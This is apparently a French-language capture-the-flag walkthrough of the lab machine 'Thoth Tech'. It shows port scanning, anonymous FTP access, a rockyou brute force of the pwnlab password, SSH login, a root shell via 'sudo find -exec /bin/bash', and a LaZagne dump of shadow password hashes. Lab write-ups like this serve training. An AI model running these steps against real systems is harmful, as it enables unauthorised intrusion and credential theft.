# Thoth Tech

<span style="color: #dddddd;">👁️</span> Massap

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 80/tcp open
[+] 22/tcp open
[+] 21/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.254-tcp.html     |
==========================================================
```

&nbsp;

**🖥️ NetExec**

Test de la connexion anonyme sur le FTP & téléchargement du fichier trouver

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --ls
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [*] Directory Listing
FTP         192.168.56.254  21     192.168.56.254   -rw-r--r--    1 0        0             110 Jul 02  2021 note.txt
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u '' -p '' --get note.txt
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] : - Anonymous Login!
FTP         192.168.56.254  21     192.168.56.254   [+] Downloaded: note.txt
┌─[m0rph3u5@parrot]─[~]
└──╼ $cat note.txt
Dear pwnlab,

My name is jake. Your password is very weak and easily crackable, I think change your password.
```

&nbsp;

Crack du mot de passe

```
┌──[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u pwnlab -p rockyou.txt | grep '[+]'
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] pwnlab:babygirl1
```

&nbsp;

Test du mot de passe cracker sur le `FTP` & `SSH`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $nxc ssh 192.168.56.254 -u pwnlab -p babygirl1
SSH         192.168.56.254  22     192.168.56.254   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
SSH         192.168.56.254  22     192.168.56.254   [+] pwnlab:babygirl1 (Pwn3d!) Linux - Shell access!
┌──[m0rph3u5@parrot]─[~]
└──╼ $nxc ftp 192.168.56.254 -u pwnlab -p babygirl1
FTP         192.168.56.254  21     192.168.56.254   [*] Banner: (vsFTPd 3.0.3)
FTP         192.168.56.254  21     192.168.56.254   [+] pwnlab:babygirl1
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
pwnlab@thothtech:/tmp/fullEx$ bash fullEx.sh -perm
pwnlab@thothtech:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for pwnlab on thothtech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwnlab may run the following commands on thothtech:
    (root) NOPASSWD: /usr/bin/find
```

&nbsp;

**#️⃣ GTFobin - find**

**https://gtfobins.github.io/gtfobins/find/#sudo**

```
pwnlab@thothtech:/tmp/fullEx$ sudo find . -exec /bin/bash \; -quit
root@thothtech:/tmp/fullEx#
```

&nbsp;

🛰️ **fullEx**

Voyons ce que notre amis trouve

```
root@thothtech:/tmp/fullEx# ./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: thoth_tech
Hash: $6$KrcpV5rf8FhVB4Gy$blJJ5Z8QOl39oED0DyXBk2wMQs2TXKQbrvqLBQDfbxPZnf/BeLIF6YrxPEVDEPGRAc1m.fqHtEMSH4OSDpv7r1:18806:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$.BsZZo1bPqacqniP$70iH0QoXAYT30b0Eixx/YCPq3uHD7K36lPmrQPrP6Hxdu5iSRU8fLfj1kUrtQ5Op0ZuBksNK7SzqxDYHvS7rl1:18810:0:99999:7:::

[+] Hash found !!!
Login: pwnlab
Hash: $6$lbyBCOWsVlvXLJXZ$tqTLWPP2.dyRXvqDZyolMw4RWWn0HPi3qFRNTR/MPnF.cMKIgvLeKACLY5wDoA94DJG6Are2yBL3atwalNr3I1:18810:0:99999:7:::


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 9.126583814620972
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| pwnlab | babygirl1 |
